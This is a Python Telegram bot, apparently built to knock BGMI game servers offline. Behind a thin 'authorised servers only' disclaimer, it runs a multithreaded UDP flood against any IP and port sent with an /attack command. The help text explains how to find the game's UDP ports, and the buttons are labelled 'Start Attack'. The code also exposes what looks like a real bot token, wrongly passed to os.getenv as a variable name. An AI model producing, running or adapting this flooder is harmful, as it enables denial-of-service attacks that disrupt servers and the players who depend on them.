#!/usr/bin/env python3
"""
BGMI UDP Tester Telegram Bot — শুধুমাত্র অনুমোদিত সার্ভারের জন্য
"""

import os
import socket
import random
import threading
import time
import asyncio
import logging
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

load_dotenv()
BOT_TOKEN = os.getenv("8924615725:AAHT5PsPEm9lsKtFwJoaXUKCjUFYcCiH4nE")
AUTHORIZED_USERS = [int(os.getenv("5841575103", 0))]
MAX_DURATION = 300

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

class UDPFlooder:
    def __init__(self, target_ip, target_port, threads, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.duration = duration
        self.is_running = False
        self.packets_sent = 0
        self.start_time = None
        self.result = {}
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
    
    def _generate_payload(self):
        payload_type = random.randint(0, 3)
        if payload_type == 0:
            return random._urandom(1400)
        elif payload_type == 1:
            return random._urandom(512)
        elif payload_type == 2:
            return random._urandom(100)
        else:
            packet = bytearray()
            packet.extend(b'\x00\x01\x00\x00')
            packet.extend(random._urandom(50))
            packet.extend(b'\xba\xaa\xaa\xbb')
            packet.extend(random._urandom(50))
            return bytes(packet)
    
    def _flood_worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while not self._stop_event.is_set():
            try:
                payload = self._generate_payload()
                sock.sendto(payload, (self.target_ip, self.target_port))
                with self._lock:
                    self.packets_sent += 1
            except:
                pass
    
    async def start(self):
        self.is_running = True
        self.start_time = time.time()
        self.packets_sent = 0
        self._stop_event.clear()
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self._flood_worker, daemon=True)
            t.start()
            threads.append(t)
        await asyncio.sleep(self.duration)
        self.stop()
        elapsed = time.time() - self.start_time
        speed = int(self.packets_sent / elapsed) if elapsed > 0 else 0
        self.result = {
            'packets_sent': self.packets_sent,
            'avg_speed': speed,
            'duration': int(elapsed),
            'target': f"{self.target_ip}:{self.target_port}"
        }
        return self.result
    
    def stop(self):
        self._stop_event.set()
        self.is_running = False
    
    def get_stats(self):
        if not self.is_running:
            return None
        elapsed = int(time.time() - self.start_time) if self.start_time else 0
        speed = int(self.packets_sent / elapsed) if elapsed > 0 else 0
        return {
            'target': f"{self.target_ip}:{self.target_port}",
            'packets_sent': self.packets_sent,
            'threads': self.threads,
            'elapsed': elapsed,
            'speed': speed
        }

flooder = None

def check_auth(user_id):
    return user_id in AUTHORIZED_USERS

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not check_auth(user_id):
        await update.message.reply_text("❌ আপনি অনুমোদিত নন।")
        return
    keyboard = [
        [InlineKeyboardButton("🚀 Start Attack", callback_data="attack")],
        [InlineKeyboardButton("⏹ Stop Attack", callback_data="stop")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 *BGMI UDP Tester Bot*\n\nআপনার অনুমোদিত সার্ভারে UDP লোড টেস্ট চালানোর জন্য বট প্রস্তুত।\n\n⚠️ *শুধুমাত্র আপনার নিজস্ব সার্ভারে ব্যবহার করুন*",
        reply_markup=reply_markup, parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if not check_auth(user_id):
        await query.edit_message_text("❌ আপনি অনুমোদিত নন।")
        return
    global flooder
    if query.data == "attack":
        await query.edit_message_text(
            "🎯 *এটাক প্যারামিটার সেট করুন*\n\nফরম্যাট:\n`/attack <IP> <PORT> <THREADS> <DURATION>`\n\nউদাহরণ:\n`/attack 192.168.1.100 20000 100 60`\n\n"
            f"⏱ সর্বোচ্চ সময়: {MAX_DURATION} সেকেন্ড\n🧵 সর্বোচ্চ থ্রেড: 500",
            parse_mode='Markdown'
        )
    elif query.data == "stop":
        if flooder and flooder.is_running:
            flooder.stop()
            await query.edit_message_text("⏹ *টেস্ট বন্ধ করা হয়েছে*", parse_mode='Markdown')
        else:
            await query.edit_message_text("❌ কোনো চলমান টেস্ট নেই।")
    elif query.data == "status":
        if flooder and flooder.is_running:
            stats = flooder.get_stats()
            await query.edit_message_text(
                f"📊 *চলমান টেস্ট*\n\n🎯 টার্গেট: `{stats['target']}`\n📦 প্যাকেট পাঠানো: {stats['packets_sent']}\n"
                f"⚡ থ্রেড: {stats['threads']}\n⏱ চলমান: {stats['elapsed']}সেকেন্ড\n📈 স্পীড: {stats['speed']} pkt/s",
                parse_mode='Markdown'
            )
        else:
            await query.edit_message_text("ℹ️ কোনো চলমান টেস্ট নেই।")
    elif query.data == "help":
        await query.edit_message_text(
            "🆘 *হেল্প*\n\n🔹 `/attack <IP> <PORT> <THREADS> <DURATION>` — টেস্ট শুরু\n🔹 বাটন ইউজ করুন ইন্টারঅ্যাক্ট করার জন্য\n\n"
            "*কিভাবে BGMI UDP পোর্ট খুঁজবেন:*\nনিজের লোকাল নেটওয়ার্কে BGMI চালান এবং `netstat -an` চালান\nUDP কানেকশন দেখুন\n\n⚠️ *শুধুমাত্র অনুমোদিত সার্ভারে ব্যবহার করুন*",
            parse_mode='Markdown'
        )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not check_auth(user_id):
        await update.message.reply_text("❌ আপনি অনুমোদিত নন।")
        return
    global flooder
    try:
        args = context.args
        if len(args) != 4:
            await update.message.reply_text(
                "❌ ভুল ফরম্যাট!\n\n`/attack <IP> <PORT> <THREADS> <DURATION>`\n\nউদাহরণ: `/attack 192.168.1.100 20000 100 60`",
                parse_mode='Markdown'
            )
            return
        target_ip = args[0]
        target_port = int(args[1])
        threads = int(args[2])
        duration = int(args[3])
        if duration > MAX_DURATION:
            await update.message.reply_text(f"❌ সর্বোচ্চ {MAX_DURATION} সেকেন্ড অনুমোদিত।")
            return
        if threads > 500:
            await update.message.reply_text("❌ সর্বোচ্চ 500 থ্রেড অনুমোদিত।")
            return
        if flooder and flooder.is_running:
            await update.message.reply_text("❌ ইতিমধ্যে একটি টেস্ট চলছে। আগে বন্ধ করুন।")
            return
        await update.message.reply_text(
            f"✅ *টেস্ট শুরু হচ্ছে...*\n\n🎯 টার্গেট: `{target_ip}:{target_port}`\n🧵 থ্রেড: {threads}\n⏱ সময়: {duration}সেকেন্ড",
            parse_mode='Markdown'
        )
        flooder = UDPFlooder(target_ip, target_port, threads, duration)
        result = await flooder.start()
        await update.message.reply_text(
            f"✅ *টেস্ট সম্পন্ন*\n\n🎯 টার্গেট: `{result['target']}`\n📦 মোট প্যাকেট: {result['packets_sent']}\n"
            f"⚡ গড় স্পীড: {result['avg_speed']} pkt/s\n⏱ সময়: {result['duration']}সেকেন্ড",
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ এরর: {str(e)}")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    logger.info("বট চালু হয়েছে...")
    app.run_polling()

if __name__ == "__main__":
    main()
